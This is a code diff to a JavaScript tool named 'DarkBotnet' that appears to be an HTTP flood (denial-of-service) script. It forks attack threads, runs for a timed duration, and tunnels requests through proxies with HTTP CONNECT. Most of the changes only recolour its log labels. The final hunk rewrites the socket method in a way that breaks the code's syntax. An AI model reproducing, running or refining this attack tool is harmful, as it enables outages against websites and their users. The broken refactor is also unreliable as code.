@@ -46,16 +46,17 @@
   Promise.race([axiosPromise, timeoutPromise])
     .then((response) => {
       const { status, data } = response;
-      console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
+      console.log(`[\x1b[37mDarkBotnet\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
     })
     .catch((error) => {
       if (error.message === 'Request timed out') {
-        console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} Request Timed Out`);
+        console.log(`[\x1b[33mDarkBotnet\x1b[0m] 
+        ${getCurrentTime()} Request Timed Out`);
       } else if (error.response) {
         const extractedTitle = getTitleFromHTML(error.response.data);
-        console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
+        console.log(`[\x1b[32mDarkBotnet\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
       } else {
-        console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} ${error.message}`);
+        console.log(`[\x1b[34mDarkBotnet\x1b[0m] ${getCurrentTime()} ${error.message}`);
       }
     });
 }
@@ -117,15 +118,15 @@ if (cluster.isMaster){
    ░     ░        ░     ░  ░       ░ ░  
                                         
 `);
-  console.log(`\x1b[96mDarkBotnet\x1b[0m`);
+  console.log(`\x1b[31mDarkBotnet\x1b[0m`);
   for (let i = 1; i <= process.argv[5]; i++){
     cluster.fork();
-    console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
+    console.log(`[\x1b[32mDarkBotnet\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
   }
-  console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
+  console.log(`[\x1b[33mDarkBotnet\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
   setInterval(getStatus, 2000);
   setTimeout(() => {
-    console.log(`[\x1b[35mDarkBotnet\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
+    console.log(`[\x1b[34mDarkBotnet\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
     process.exit(1);
   }, process.argv[3] * 1000);
 } 
@@ -778,12 +779,21 @@ const uap = [
  class NetSocket {
      constructor(){}
  
-  HTTP(options, callback) {
-     const parsedAddr = options.address.split(":");
-     const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
-     const buffer = new Buffer.from(payload);
- 
+  function HTTP(options, callback) {
+  const { address } = options; // Destructure the 'address' property from 'options' object.
+  const parsedAddr = address.split(":");
+  const addrHost = parsedAddr[0];
+  
+  const payload = `CONNECT ${address}:443 HTTP/1.1
+Host: ${address}:443
+Proxy-Connection: Keep-Alive
+Connection: Keep-Alive\r\n\r\n`;
+  
+  const buffer = Buffer.from(payload); // Use 'Buffer.from' instead of 'new Buffer.from' for compatibility.
+
+  // You can now continue with your code as needed.
+}
+
      const connection = net.connect({
          host: options.host,
          port: options.port
